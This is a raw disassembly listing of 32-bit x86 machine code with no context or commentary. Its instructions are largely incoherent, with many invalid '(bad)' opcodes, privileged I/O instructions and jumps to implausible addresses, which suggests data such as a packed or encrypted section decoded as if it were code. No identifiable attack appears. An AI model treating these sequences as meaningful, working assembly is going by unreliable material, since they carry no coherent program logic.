  41025b:	jecxz  0x4102c7
	...
  410269:	add    BYTE PTR [eax],al
  41026b:	add    BYTE PTR [edx+0x6],dl
  41026e:	jmp    0xc0884d76
  410273:	ret    0x6fcc
  410276:	fild   DWORD PTR [edi]
  410278:	mov    ebx,0xbd78acf5
  41027d:	aad    0x61
  41027f:	push   ebx
  410280:	out    0x8a,eax
  410282:	push   esp
  410283:	jo     0x410232
  410285:	jo     0x41021f
  410287:	aad    0xbc
  410289:	in     eax,0xac
  41028b:	js     0x41022a
  41028d:	jle    0x4102fa
  41028f:	push   edi
  410290:	lea    esi,[eax+0x2d]
  410293:	imul   edx,esi,0xffffffbd
  410296:	and    eax,0x9104fa78
  41029b:	push   ebx
  41029c:	and    eax,0xaf78e8c6
  4102a1:	push   ecx
  4102a2:	adc    eax,0xbb706d78
  4102a7:	into   
  4102a8:	cmp    eax,esi
  4102aa:	call   0xfffd191a
  4102af:	cmc    
  4102b0:	int3   
  4102b1:	jge    0x410237
  4102b3:	stc    
  4102b4:	mov    esp,0x5f53fe6f
  4102b9:	fst    st(4)
  4102bb:	es es jo 0x4102bc
  4102bf:	pushf  
  4102c0:	fwait
  4102c1:	ja     0x4102c1
  4102c3:	into   
  4102c4:	mov    ah,0x39
  4102c6:	push   ebp
  4102c7:	adc    BYTE PTR [esi],bl
  4102c9:	jo     0x4102b1
  4102cb:	popa   
  4102cc:	sub    BYTE PTR [edi-0x2],ch
  4102cf:	pusha  
	...
  4102dc:	add    BYTE PTR [eax],al
  4102de:	add    dl,ah
  4102e0:	pop    ebx
  4102e1:	imul   BYTE PTR [esi+0x10ffde94]
  4102e7:	test   eax,0x75e940c7
  4102ec:	mov    ecx,0x6f6c9edb
  4102f1:	(bad)  
  4102f2:	aam    0x13
  4102f4:	sbb    eax,0xee78e941
  4102f9:	dec    edx
  4102fa:	jle    0x410350
  4102fc:	jge    0x410282
  4102fe:	add    DWORD PTR [edi+ebp*2-0x2],0xdedd6703
  410306:	scas   al,BYTE PTR es:[edi]
  410307:	lahf   
  410308:	outs   dx,DWORD PTR ds:[esi]
  410309:	std    
  41030a:	xchg   esp,eax
  41030b:	sbb    esi,DWORD PTR [edi-0x2]
  41030e:	push   esi
  41030f:	sub    al,0x39
  410311:	push   ebp
  410312:	add    BYTE PTR [esi-0x665a1991],ah
  410318:	outs   dx,BYTE PTR ds:[esi]
  410319:	(bad)  
  41031a:	jo     0x4102fe
  41031c:	arpl   si,si
  41031e:	ss or  al,0xde
  410321:	inc    eax
  410323:	sub    al,0xc7
  410325:	inc    eax
  410326:	jmp    0x171cbc38
  41032b:	hlt    
  41032c:	outs   dx,BYTE PTR ds:[esi]
  41032d:	(bad)  
  41032e:	fcom   QWORD PTR [ebx-0x716bee4]
  410334:	xor    DWORD PTR [ebx+0x0],ecx
  410337:	pop    ebp
  410338:	clc    
  410339:	xchg   DWORD PTR [ebp-0x22196],eax
  41033f:	leave  
  410340:	lods   al,BYTE PTR ds:[esi]
  410341:	jmp    0x0:0xf7
	...
  410350:	add    BYTE PTR [eax],al
  410352:	cmp    eax,0x8973fef8
  410357:	popa   
  410358:	(bad)  
  410359:	jmp    FWORD PTR ds:0x4275fdb9
  41035f:	fist   DWORD PTR [ecx-0x207e2bc]
  410365:	mov    ch,0xea
  410367:	(bad)  
  410369:	(bad)  
  41036a:	fnsave [ebp+0x6]
  41036d:	call   0x3eb297
  410372:	mov    ebp,0xbdf7eab5
  410377:	idiv   ebp
  410379:	jne    0x41036d
  41037b:	fcmovbe st,st(7)
  41037d:	inc    esp
  41037e:	int    0xf7
  410380:	std    
  410381:	mov    ch,0xe2
  410383:	(bad)  
  410385:	(bad)  
  410386:	fnsave [ebp+0x6]
  410389:	call   0x3eb29f
  41038e:	dec    ebp
  41038f:	mov    ch,0xe2
  410391:	idiv   DWORD PTR ds:0xd275fdf7
  410397:	fidivr DWORD PTR [ebx-0x208e2bc]
  41039d:	mov    ch,0x2a
  41039f:	(bad)  
  4103a1:	call   FWORD PTR ds:0xcde80675
  4103a7:	scas   al,BYTE PTR es:[edi]
  4103a8:	std    
  4103a9:	call   FWORD PTR [ebp-0x4b]
  4103ac:	(bad)  
  4103ae:	dec    ebp
  4103af:	idiv   ebp
  4103b1:	jne    0x410335
  4103b3:	fidivr DWORD PTR [esi-0x2]
	...
  4103c2:	add    BYTE PTR [eax],al
  4103c4:	add    BYTE PTR ds:0x3eb5fdf7,bh
  4103ca:	(bad)  
  4103cc:	jmp    DWORD PTR [ebx+0x4]
  4103cf:	stos   BYTE PTR es:[edi],al
  4103d0:	inc    esi
  4103d1:	ins    BYTE PTR es:[edi],dx
  4103d2:	push   DWORD PTR [ebp-0x4c]
  4103d5:	jae    0x410446
  4103d7:	je     0x4103d7
  4103d9:	dec    ebx
  4103da:	mov    esp,0x7754febd
  4103df:	scas   al,BYTE PTR es:[edi]
  4103e0:	jmp    0x410436
  4103e2:	pop    edi
  4103e3:	je     0x4103cc
  4103e5:	out    dx,al
  4103e6:	push   ds
  4103e7:	jne    0x4103e7
  4103e9:	cmp    al,0x99
  4103eb:	imul   esi,esi,0x34
  4103ee:	push   edi
  4103ef:	imul   ecx,DWORD PTR [ecx-0x18bc05c],0xffffffee
  4103f6:	aas    
  4103f7:	ins    BYTE PTR es:[edi],dx
  4103f8:	(bad)  
  4103f9:	sbb    al,0x54
  4103fb:	hlt    
  4103fc:	inc    esi
  4103fd:	adc    al,0xb7
  4103ff:	je     0x4103b5
  410401:	add    esi,DWORD PTR [edi+0xffbfe74]
  410407:	mov    ebp,0xbe8efcfe
  41040c:	test   DWORD PTR [edx],0xecfe75fc
  410412:	jle    0x410402
  410414:	sti    
  410415:	sti    
  410416:	lds    ebx,FWORD PTR [edx]
  410418:	add    BYTE PTR [ebx-0x4b],ah
  41041b:	inc    ecx
  41041c:	pop    es
  41041d:	arpl   WORD PTR [ecx],dx
  41041f:	mov    ebx,ebp
  410421:	loopne 0x4103ca
  410423:	ja     0x41048e
  410425:	arpl   WORD PTR [edx-0x37],dx
  410428:	inc    BYTE PTR [eax]
	...
  410436:	add    BYTE PTR [eax],al
  410438:	ss je  0x4104a5
  41043b:	test   DWORD PTR [edi],ebx
  41043d:	xlat   BYTE PTR ds:[ebx]
  41043e:	je     0x4103c8
  410440:	es shr bl,0xb0
  410444:	sbb    al,0x9d
  410446:	add    bh,bh
  410448:	push   ss
  410449:	je     0x4104b5
  41044b:	pop    es
  41044c:	xchg   ebp,eax
  41044d:	ss jne 0x41044e
  410450:	push   ss
  410451:	and    BYTE PTR [ebp+0x74],dh
  410454:	pop    ebx
  410455:	add    eax,0x6e20b311
  41045a:	sbb    eax,0xe908a24b
  41045f:	into   
  410460:	fldenv [eax+0x69]
  410463:	inc    eax
  410464:	jo     0x4104d3
  410466:	jnp    0x41046f
  410468:	dec    ebx
  410469:	and    esp,ecx
  41046b:	add    esp,DWORD PTR [ebx+0x0]
  41046e:	sub    edi,ebp
  410470:	pusha  
  410471:	sub    cl,BYTE PTR ds:[eax]
  410474:	arpl   WORD PTR [ebx+ebx*2+0x14],bp
  410478:	dec    ebx
  410479:	adc    eax,DWORD PTR [ecx]
  41047b:	add    al,0x63
  41047d:	add    BYTE PTR [ecx-0x55c19f12],ch
  410483:	pop    es
  410484:	arpl   WORD PTR [esi+0x2b],di
  410487:	jl     0x4104a6
  410489:	repz shr BYTE PTR [ebx+0x6f],0xc4
  41048e:	mov    ch,0x74
  410490:	fcmovnb st,st(2)
  410492:	lods   al,BYTE PTR ds:[esi]
  410493:	je     0x410424
  410495:	imul   esp,DWORD PTR [ebp+0x136cf4ee],0x14
	...
  4104ab:	or     edi,DWORD PTR [edx+edi*1]
  4104ae:	jne    0x41049d
  4104b0:	add    BYTE PTR [ecx+0x2b7e29ef],ch
  4104b6:	jo     0x410502
  4104b8:	add    eax,0xd5d0be6c
  4104bd:	jne    0x4104ad
  4104bf:	enter  0xba5d,0xe7
  4104c3:	lds    ebp,FWORD PTR [ecx+esi*8+0x43]
  4104c7:	xor    BYTE PTR [ebx],ah
  4104c9:	rol    DWORD PTR [ebx],1
  4104cb:	push   ebx
  4104cc:	pop    esp
  4104cd:	xchg   esi,eax
  4104ce:	je     0x410507
  4104d0:	std    
  4104d1:	inc    eax
  4104d2:	shl    DWORD PTR [ecx],cl
  4104d4:	ins    BYTE PTR es:[edi],dx
  4104d5:	inc    ebp
  4104d6:	je     0x4104ef
  4104d8:	stc    
  4104d9:	cmp    eax,0xff5d5cee
  4104de:	lea    esp,[ebx+0x752efe6b]
  4104e4:	js     0x4104e4
  4104e6:	pushf  
  4104e7:	hlt    
  4104e8:	push   0x74
  4104ea:	icebp  
  4104eb:	or     cl,bl
  4104ed:	inc    edx
  4104ee:	push   ss
  4104ef:	imul   DWORD PTR [edx+0x74]
  4104f2:	or     eax,0x645a1f8
  4104f7:	xlat   BYTE PTR ds:[ebx]
  4104f8:	cmp    eax,0xd260edc1
  4104fd:	mov    al,BYTE PTR ds:0x97d347e3
  410503:	iret   
  410504:	icebp  
  410505:	or     edx,ecx
  410507:	dec    eax
  410508:	mov    edi,0xac34defe
  41050d:	je     0x4104fb
	...
  41051b:	add    BYTE PTR [eax],al
  41051d:	add    BYTE PTR [edx],dl
  41051f:	cmp    eax,0x7a60ddc1
  410524:	inc    esp
  410525:	mov    ecx,0xed746b37
  41052a:	mov    eax,0x90b64c0d
  41052f:	(bad)  
  410530:	mov    edi,0xff4bdcde
  410535:	call   0x9db5719a
  41053a:	xchg   edi,eax
  41053b:	add    DWORD PTR [ebp-0x6a],0x7d447d70
  410542:	jo     0x410535
  410544:	sti    
  410545:	xchg   dl,bl
  410547:	pop    edi
  410548:	(bad)  
  410549:	hlt    
  41054a:	dec    eax
  41054b:	fs stos BYTE PTR es:[edi],al
  41054d:	das    
  41054e:	push   eax
  41054f:	imul   ecx,DWORD PTR [edx-0x5da2db0c],0xffffffe9
  410556:	pusha  
  410557:	add    eax,0xc4f8ed68
  41055c:	(bad)  
  41055d:	mov    esi,0xe9177408
  410562:	pusha  
  410563:	add    al,al
  410565:	add    bh,bl
  410567:	cld    
  410568:	call   0x489005
  41056d:	mov    ecx,DWORD PTR [edx+0x49]
  410570:	or     cl,BYTE PTR [eax-0x45]
  410573:	pop    es
  410574:	call   0x4882b2
  410579:	add    ebx,DWORD PTR [edx-0x16]
  41057c:	jae    0x410566
  41057e:	loop   0x41057b
  410580:	inc    edi
  410581:	inc    ecx
	...
  41058e:	add    BYTE PTR [eax],al
  410590:	add    BYTE PTR [edx+0x4d],bh
  410593:	out    0xd3,al
  410595:	inc    edx
  410596:	pop    es
  410597:	add    BYTE PTR [ebx],cl
  410599:	mov    ch,BYTE PTR [eax+eax*1-0x15]
  41059d:	int3   
  41059e:	call   0xe4308db1
  4105a3:	xchg   DWORD PTR [ebp+0x2e],eax
  4105a6:	dec    edi
  4105a7:	sbb    al,0x48
  4105a9:	mov    eax,DWORD PTR [ecx]
  4105ab:	push   esi
  4105ac:	call   0x410481
  4105b1:	inc    ecx
  4105b2:	(bad)  
  4105b3:	jae    0x4105b7
  4105b5:	xor    DWORD PTR [esi-0x77],edx
  4105b8:	lock mov dl,0x17
  4105bb:	dec    eax
  4105bc:	inc    ecx
  4105bd:	cli    
  4105be:	into   
  4105bf:	cld    
  4105c0:	push   ss
  4105c1:	cli    
  4105c2:	push   es
  4105c3:	add    esi,eax
  4105c5:	jae    0x410634
  4105c7:	fisubr DWORD PTR [eax-0xa]
  4105ca:	scas   al,BYTE PTR es:[edi]
  4105cb:	aas    
  4105cc:	add    BYTE PTR [ecx+ecx*8],ch
  4105cf:	xchg   esi,eax
  4105d0:	sbb    dl,bh
  4105d2:	push   es
  4105d3:	or     eax,eax
  4105d5:	fild   WORD PTR [eax]
  4105d7:	jmp    0x410614
  4105d9:	push   eax
  4105da:	push   ss
  4105db:	mov    BYTE PTR [ebp-0x13],dl
  4105de:	jmp    0x3d82de26
  4105e3:	loop   0x4105ab
  4105e5:	retf   0x8b06
  4105e8:	inc    ebp
  4105e9:	and    bh,BYTE PTR [esi+edi*8-0x82c9c01]
  4105f0:	(bad)  [ecx+edx*2+0xfe5a]
	...
  410603:	add    BYTE PTR [esi],dl
  410605:	je     0x410661
  410607:	xchg   edx,eax
  410608:	xchg   ebp,eax
  410609:	sub    esi,DWORD PTR [edx-0x77]
  41060c:	ss mov edi,0xe47f447d
  410612:	adc    cl,BYTE PTR [edx+0x447e2b16]
  410618:	fwait
  410619:	hlt    
  41061a:	adc    al,BYTE PTR [eax-0x7afea3d3]
  410620:	psubq  mm6,QWORD PTR [ecx-0x2]
  410624:	pop    esp
  410625:	jmp    0xa143ed88
  41062a:	jno    0x41062a
  41062c:	ficomp WORD PTR [eax+0x233b4f72]
  410632:	mov    esi,0x3573cfe
  410637:	pop    esi
  410638:	sub    bl,BYTE PTR [esi-0x18690001]
  41063e:	pop    edi
  41063f:	(bad)  
  410640:	scas   al,BYTE PTR es:[edi]
  410641:	dec    eax
  410642:	pop    edx
  410643:	aam    0xaa
  410645:	inc    ebx
  410646:	jo     0x410652
  410648:	and    esi,DWORD PTR [eax]
  41064a:	sbb    ebp,DWORD PTR [eax-0x4]
  41064d:	sbb    al,bl
  41064f:	call   DWORD PTR [esp+eax*2-0x5d03b723]
  410656:	shl    DWORD PTR [edi+0x65],cl
  410659:	scas   al,BYTE PTR es:[edi]
  41065a:	ret    
  41065b:	inc    DWORD PTR [esp+ebx*2+0x3a5ef02]
  410662:	add    al,0x48
  410664:	and    bl,BYTE PTR [edx+edx*8-0x2]
	...
  410674:	add    BYTE PTR [eax],al
  410676:	add    BYTE PTR [esi+0x74],cl
  410679:	pop    edx
  41067a:	cmp    DWORD PTR [ebx],0x2ae770f3
  410680:	and    DWORD PTR [ecx-0x2],esi
  410683:	stos   BYTE PTR es:[edi],al
  410684:	add    al,0x2b
  410686:	cld    
  410687:	mov    ah,0xd0
  410689:	jno    0x4106eb
  41068b:	loope  0x4106cd
  41068d:	push   esp
  41068e:	fisub  WORD PTR [ebx+ebx*8-0x2e88f5e]
  410695:	push   eax
  410696:	in     eax,dx
  410697:	and    ch,BYTE PTR [edx+0x3d]
  41069a:	jnp    0x4106c3
  41069c:	imul   eax,edx,0xe0ef840d
  4106a2:	pop    ebx
  4106a3:	(bad)  
  4106a4:	imul   esp,DWORD PTR ds:0x1e260a71,0x715d64f7
  4106ae:	jno    0x410715
  4106b0:	imul   eax,DWORD PTR [edx-0xf0ca3f1],0xfd68f35b
  4106ba:	jo     0x410680
  4106bc:	add    eax,0xde0660e9
  4106c1:	repnz enter 0x5a3,0x51
  4106c6:	popa   
  4106c7:	popf   
  4106c8:	(bad)  
  4106c9:	call   0xc13ebe3e
  4106ce:	es mov ecx,0x9770cd68
  4106d4:	imul   eax,ebp,0x3e5d5cf6
  4106da:	mov    BYTE PTR [eax],0x0
	...
  4106e9:	add    BYTE PTR ds:0x60459f69,cl
  4106ef:	add    eax,0x87087d14
  4106f4:	lods   al,BYTE PTR ds:[esi]
  4106f5:	dec    ebx
  4106f6:	in     eax,dx
  4106f7:	push   0x69a77e9d
  4106fc:	cmp    BYTE PTR [ecx+0x6f],dh
  4106ff:	stc    
  410700:	(bad)  
  410701:	mul    BYTE PTR [ebp+ebx*2+0x2c]
  410705:	sbb    DWORD PTR [ebx+0x5],esp
  410708:	repnz inc ebx
  41070a:	pop    ebp
  41070b:	cmp    bh,0xa8
  41070e:	popa   
  41070f:	add    eax,0x70a5a600
  410714:	(bad)  
  410715:	call   0xa5080c7a
  41071a:	xor    al,0x67
  41071c:	push   es
  41071d:	jmp    0xc340e282
  410722:	pusha  
  410723:	(bad)  
  410725:	shl    BYTE PTR [eax+0x7a],cl
  410728:	inc    esp
  410729:	xor    eax,0x3d8479b0
  41072e:	or     esp,DWORD PTR [edi-0x2]
  410731:	cdq    
  410732:	repz lock mul DWORD PTR [esi]
  410736:	ins    DWORD PTR es:[edi],dx
  410737:	ins    BYTE PTR es:[edi],dx
  410738:	out    0xf7,eax
  41073a:	dec    ebx
  41073b:	add    eax,0xf420e200
  410740:	add    al,0x0
  410742:	out    0x4,eax
  410744:	add    cl,ch
  410746:	cmp    BYTE PTR [edx+0x27],al
  410749:	test   al,0x60
  41074b:	push   0xe574
	...
  41075c:	add    BYTE PTR [eax-0x3311b7d3],ch
  410762:	mov    eax,0x80e2b98a
  410767:	repz (bad) 
  410769:	mov    esp,0x873b4f67
  41076e:	sbb    eax,0x7d8cce48
  410773:	test   BYTE PTR [ecx-0x2e019874],ah
  410779:	cld    
  41077a:	ret    
  41077b:	(bad)  
  41077c:	mov    dh,0x29
  41077e:	push   0xc4bf2366
  410783:	jmp    DWORD PTR [ebp-0x6109b046]
  410789:	jl     0x4107f2
  41078b:	je     0x41076e
  41078d:	mov    BYTE PTR [esi+0x7d4c8e46],al
  410793:	test   BYTE PTR [eax],al
  410795:	pop    edx
  410796:	lock std 
  410798:	push   DWORD PTR [eax+0x1]
  41079b:	push   0xfe428253
  4107a0:	(bad)  
  4107a1:	ja     0x41075c
  4107a3:	cmc    
  4107a4:	(bad)  
  4107a5:	cmp    eax,0x120873d8
  4107aa:	pusha  
  4107ab:	inc    ebp
  4107ac:	dec    DWORD PTR ds:0x35ec83ea
  4107b2:	fdivr  st,st(5)
  4107b4:	push   0xffffff8a
  4107b6:	dec    ebx
  4107b7:	pop    edx
  4107b8:	dec    eax
  4107b9:	mov    ebx,0x72b5ff03
  4107be:	lock std 
  4107c0:	inc    DWORD PTR [eax]
	...
  4107ce:	add    BYTE PTR [eax],al
  4107d0:	dec    ebp
  4107d1:	outs   dx,BYTE PTR ds:[esi]
  4107d2:	push   es
  4107d3:	call   0x3e4686
  4107d8:	repz jge 0x4107c1
  4107db:	test   DWORD PTR [ebp-0x28],0xee8e858b
  4107e2:	std    
  4107e3:	(bad)  
  4107e4:	cli    
  4107e5:	dec    edx
  4107e6:	arpl   WORD PTR [eax-0x5],cx
  4107e9:	add    bh,bh
  4107eb:	mov    ch,0x72
  4107ed:	out    dx,al
  4107ee:	std    
  4107ef:	dec    DWORD PTR [ebp+0x6e]
  4107f2:	push   es
  4107f3:	call   0x3e4646
  4107f8:	mov    bl,0x7d
  4107fa:	loop   0x4107f3
  4107fc:	or     eax,0xa20068d8
  410801:	jno    0x410849
  410803:	inc    ecx
  410804:	or     bl,al
  410806:	mov    bl,0xd8
  410808:	aad    0xd7
  41080a:	std    
  41080b:	inc    DWORD PTR [edi+0x69]
  41080e:	out    0x11,al
  410810:	inc    ebp
  410811:	(bad)  
  410812:	std    
  410813:	mov    DWORD PTR [edi-0x32000a1e],eax
  410819:	cmp    DWORD PTR [ebx+0x6d8763f0],0xfffffffe
  410820:	arpl   WORD PTR [eax],dx
  410822:	fild   DWORD PTR [edx-0x18a6eea]
  410828:	int3   
  410829:	pop    esp
  41082a:	mul    BYTE PTR [ecx-0x20]
  41082d:	xor    DWORD PTR [ebx-0xa],ebx
  410830:	mov    esp,0x7402d7
	...
  410841:	add    BYTE PTR [eax],al
  410843:	sbb    dl,BYTE PTR [edx+eax*1+0x0]
  410847:	mov    esp,0x53746d86
  41084c:	(bad)  
  41084d:	(bad)  
  41084e:	aas    
  41084f:	pushf  
  410850:	mov    bh,0x6d
  410852:	mov    ah,0x93
  410854:	daa    
  410855:	outs   dx,BYTE PTR ds:[esi]
  410856:	dec    BYTE PTR [ecx+esi*4-0x634417ee]
  41085d:	ins    DWORD PTR es:[edi],dx
  41085e:	(bad)  
  41085f:	jl     0x410852
  410861:	pop    esi
  410862:	div    BYTE PTR [edi+ebx*1+0x6e]
  410866:	je     0x4108bb
  410868:	adc    al,0x89
  41086a:	aas    
  41086b:	movd   mm6,DWORD PTR fs:[ebx+ecx*2+0x54fe6e0f]
  410874:	jmp    0x9c20f08b
  410879:	ins    DWORD PTR es:[edi],dx
  41087a:	inc    BYTE PTR [ecx+ebp*1+0x4f]
  41087e:	idiv   BYTE PTR [edi+edx*2]
  410881:	ins    BYTE PTR es:[edi],dx
  410882:	mov    ah,0x3f
  410884:	inc    edi
  410885:	ins    BYTE PTR es:[edi],dx
  410886:	(bad)  
  410887:	sub    al,0xd1
  410889:	adc    ebp,eax
  41088b:	xchg   edi,eax
  41088c:	sbb    al,0x6d
  41088e:	(bad)  
  41088f:	sbb    al,0x91
  410891:	arpl   si,si
  410893:	adc    al,0x3f
  410895:	ins    BYTE PTR es:[edi],dx
  410896:	je     0x41090b
  410898:	push   esp
  410899:	fnstcw WORD PTR [edi]
  41089b:	add    al,0xaf
  41089d:	ins    BYTE PTR es:[edi],dx
  41089e:	je     0x4108f3
  4108a0:	xchg   edi,eax
  4108a1:	mov    dh,0xd7
  4108a3:	in     al,dx
  4108a4:	add    al,0xa6
  4108a6:	ins    DWORD PTR es:[edi],dx
	...
  4108b3:	add    BYTE PTR [eax],al
  4108b5:	add    ch,ch
  4108b7:	out    dx,eax
  4108b8:	lock pop ebx
  4108ba:	jb     0x410923
  4108bc:	xchg   ebp,eax
  4108bd:	ins    DWORD PTR es:[edi],dx
  4108be:	(bad)  [edi+0x65d575b0]
  4108c4:	nop
  4108c5:	loope  0x4108e8
  4108c7:	data16 jge 0x410937
  4108ca:	pcmpeqw mm7,QWORD PTR [ebp+0x6d]
  4108ce:	mov    ebp,0xb5c1105c
  4108d3:	gs gs mov bh,0xb8
  4108d7:	ins    DWORD PTR es:[edi],dx
  4108d8:	pop    ebp
  4108d9:	ins    DWORD PTR es:[edi],dx
  4108da:	mov    esp,0x9d6ca9b7
  4108df:	gs xchg ebx,eax
  4108e1:	pop    esp
  4108e2:	lea    esp,[ebp+0x45]
  4108e5:	pop    esp
  4108e6:	and    al,dl
  4108e8:	cmp    eax,0x4caf856d
  4108ed:	jne    0x41096c
  4108ef:	gs inc eax
  4108f1:	xor    eax,0x6d256620
  4108f6:	mov    bh,0x64
  4108f8:	adc    eax,0xc45c656d
  4108fd:	rcr    BYTE PTR [ebp+0x65],0xd
  410901:	(bad)  
  410902:	dec    esp
  410903:	outs   dx,DWORD PTR ds:[esi]
  410904:	mov    ch,0x6d
  410906:	dec    ebp
  410907:	gs std 
  410909:	test   BYTE PTR [eax+0x6e],0x7e
  41090d:	push   ss
  41090e:	arpl   WORD PTR ds:0x5684220,ax
  410914:	cmp    al,0x79
  410916:	cmp    BYTE PTR [ecx+0x6fa4],cl
	...
  410928:	add    BYTE PTR [edx+0x1db94305],bh
  41092e:	fneni(8087 only) 
  410930:	pop    ebx
  410931:	push   esi
  410932:	vpunpcklqdq ymm3,ymm7,ymm3
  410936:	retf   0x6cbc
  410939:	(bad)  
  41093a:	or     eax,0xcd454100
  41093f:	inc    eax
  410940:	jmp    0xd09622cc
  410945:	and    DWORD PTR [ebp-0x1a],esp
  410948:	xchg   ebp,eax
  410949:	jne    0x4109ae
  41094b:	(bad)  
  41094c:	xchg   esi,eax
  41094d:	aad    0xc
  41094f:	push   0xffc618c7
  410954:	adc    BYTE PTR [ecx+0x5],ah
  410957:	add    BYTE PTR [ecx+0x28],ch
  41095a:	data16 cld 
  41095c:	jbe    0x4109ad
  41095e:	arpl   WORD PTR [ebp+ebp*2+0x47],si
  410962:	fld    DWORD PTR [edi]
  410964:	push   ecx
  410965:	xchg   ecx,eax
  410966:	and    al,0xff
  410968:	pop    esi
  410969:	imul   eax,DWORD PTR [esi+0x3],0xeb8fb5e9
  410970:	push   0x1c
  410972:	pusha  
  410973:	imul   ebp,ecx,0xb4fed0aa
  410979:	mov    BYTE PTR [esp+esi*8-0xa],ch
  41097d:	packsswb mm1,QWORD PTR [eax-0x13fb5c]
  410984:	call   0x9ca8ab98
  410989:	test   al,0xc5
  41098b:	inc    DWORD PTR [eax+0x0]
	...
  410999:	add    BYTE PTR [eax],al
  41099b:	add    al,bl
  41099d:	int3   
  41099e:	inc    eax
  41099f:	jmp    0x1148e36b
  4109a4:	std    
  4109a5:	jmp    0xf6fb:0xd9b8fefe
  4109ac:	ss or  al,0xe8
  4109af:	xlat   BYTE PTR ds:[ebx]
  4109b0:	and    BYTE PTR [ebx-0x2],ah
  4109b3:	mov    al,0xa5
  4109b5:	or     BYTE PTR [eax],al
  4109b7:	xor    al,0xa4
  4109b9:	jo     0x41093b
  4109bb:	lods   eax,DWORD PTR ds:[esi]
  4109bc:	mov    bh,0x5b
  4109be:	dec    dh
  4109c0:	call   0x73f0:0x6a00fbc9
  4109c7:	or     al,0xc5
  4109c9:	push   ebp
  4109ca:	push   es
  4109cb:	call   0x40fea6
  4109d0:	add    eax,ecx
  4109d2:	or     eax,0x9ef85
  4109d7:	add    BYTE PTR [ebp-0x35ff09bb],bh
  4109dd:	pop    es
  4109de:	add    bh,al
  4109e0:	jg     0x4109b7
  4109e2:	std    
  4109e3:	pop    es
  4109e4:	mov    edx,0x70006a07
  4109e9:	or     DWORD PTR [edx+0x0],ebp
  4109ec:	pusha  
  4109ed:	or     DWORD PTR [ebp-0x74c6d1bb],ecx
  4109f3:	test   DWORD PTR [esi],ecx
  4109f5:	fdivr  st,st(5)
  4109f7:	(bad)  
  4109f8:	jmp    0xfa56:0x35f873ee
  4109ff:	call   0x410a04
	...
  410a0c:	add    BYTE PTR [eax],al
  410a0e:	add    BYTE PTR [esi*8-0x386e0001],dl
  410a15:	jb     0x410a1c
  410a17:	xor    edx,ecx
  410a19:	(bad)  
  410a1a:	dec    DWORD PTR [edx-0x34d73bc1]
  410a20:	pop    es
  410a21:	push   DWORD PTR [ebp+0x76]
  410a24:	mov    edi,0xf04545cf
  410a29:	dec    esi
  410a2a:	mov    ebx,DWORD PTR [edx+0x6df483dc]
  410a30:	out    dx,al
  410a31:	std    
  410a32:	push   eax
  410a33:	call   0x4586c9f6
  410a38:	lock xchg DWORD PTR [ebp-0x229ae],eax
  410a3f:	(bad)  
  410a40:	test   BYTE PTR [ecx-0x1],0x45
  410a44:	inc    ecx
  410a45:	(bad)  
  410a46:	addr16 aad 0x9e
  410a49:	aas    
  410a4a:	add    BYTE PTR [ebx+0x3b],ah
  410a4d:	scas   eax,DWORD PTR es:[edi]
  410a4e:	xlat   BYTE PTR ds:[ebx]
  410a4f:	or     al,0x54
  410a51:	imul   edi,esi,0x195a5496
  410a57:	sahf   
  410a58:	mov    ds:0x9ce68869,eax
  410a5d:	jno    0x410a5d
  410a5f:	hlt    
  410a60:	mov    BYTE PTR [ebx],0x68
  410a63:	and    eax,0xe5ffc515
  410a68:	mov    ecx,0x7bdcf64a
  410a6d:	imul   esi,DWORD PTR [ebx+ebp*2-0x7c],0x4369
	...
  410a81:	add    ah,cl
  410a83:	mov    edi,DWORD PTR [ebx-0x7c]
  410a86:	mov    bh,0xdb
  410a88:	imul   edi,esi,0xdada6c49
  410a8e:	sub    ebp,DWORD PTR ds:0xc4f6ff04
  410a94:	jno    0x410a94
  410a96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a97:	ret    
  410a98:	out    dx,eax
  410a99:	pop    es
  410a9a:	mov    edx,eax
  410a9c:	mov    esi,0x7fe594fe
  410aa1:	out    0x94,eax
  410aa3:	retf   
  410aa4:	imul   ecx,DWORD PTR [esi+ebx*8+0x7cfe7200],0x2bf3da7c
  410aaf:	lods   eax,DWORD PTR ds:[esi]
  410ab0:	add    bh,bh
  410ab2:	mov    dh,0xc4
  410ab4:	jno    0x410ab4
  410ab6:	fs add esi,eax
  410ab9:	pop    es
  410aba:	dec    ebx
  410abb:	xor    BYTE PTR [edi+0x7fe554fe],bh
  410ac1:	jecxz  0x410b17
  410ac3:	or     ebp,DWORD PTR [edx+0x69]
  410ac6:	arpl   WORD PTR [ebx+edi*8+0x48],si
  410aca:	mov    ds:0x1bb4696c,al
  410acf:	pop    ebx
  410ad0:	push   0x5c052cfe
  410ad5:	cld    
  410ad6:	cmp    al,0xac
  410ad8:	and    al,0x69
  410ada:	sbb    eax,0xd646b8c
  410adf:	(bad)  
  410ae0:	int    0x77
  410ae2:	out    0x34,eax
  410ae4:	mov    ebp,0x69
	...
  410af5:	add    eax,0xaa2350b5
  410afa:	(bad)  
  410afb:	call   0xb57dba68
  410b00:	imul   ebp,ebp,0xfcfc1b61
  410b06:	mov    esp,DWORD PTR [ecx+ebp*2]
  410b09:	fisttp QWORD PTR [ebx+0x61cd506b]
  410b0f:	lea    eax,[ebp+0x697d550f]
  410b15:	lds    eax,FWORD PTR [esi*8-0x7b601e24]
  410b1c:	jno    0x410ad3
  410b1e:	popa   
  410b1f:	call   0xa3c74e13
  410b24:	pop    esp
  410b25:	lods   eax,DWORD PTR ds:[esi]
  410b26:	popa   
  410b27:	pop    ebp
  410b28:	add    al,0x17
  410b2a:	mov    esp,0x726303c0
  410b2f:	mov    gs,WORD PTR [ecx+0x17]
  410b32:	cmc    
  410b33:	push   eax
  410b34:	cmp    BYTE PTR [edi+0x62],al
  410b37:	cmp    eax,0x3d54b769
  410b3c:	imul   esi,DWORD PTR [ebp+0x61],0x247b13b3
  410b43:	out    0x68,eax
  410b45:	gs popa 
  410b47:	push   ebx
  410b48:	pop    eax
  410b49:	push   ebp
  410b4a:	popa   
  410b4b:	adc    eax,0xf5cf69
  410b50:	push   ss
  410b51:	lea    esp,[eax+0x5]
  410b54:	imul   ecx,DWORD PTR [edi],0x68f56e
	...
  410b66:	add    BYTE PTR [eax],al
  410b68:	cmp    eax,0x507bff61
  410b6d:	ins    DWORD PTR es:[edi],dx
  410b6e:	add    ebp,DWORD PTR [edi-0x6301a045]
  410b74:	pushf  
  410b75:	push   edi
  410b76:	(bad)  
  410b77:	fimul  WORD PTR [ebx-0x74211c67]
  410b7d:	pop    edi
  410b7e:	(bad)  
  410b7f:	push   esp
  410b80:	ja     0x410bef
  410b82:	ret    
  410b83:	add    al,0x7a
  410b85:	pop    edi
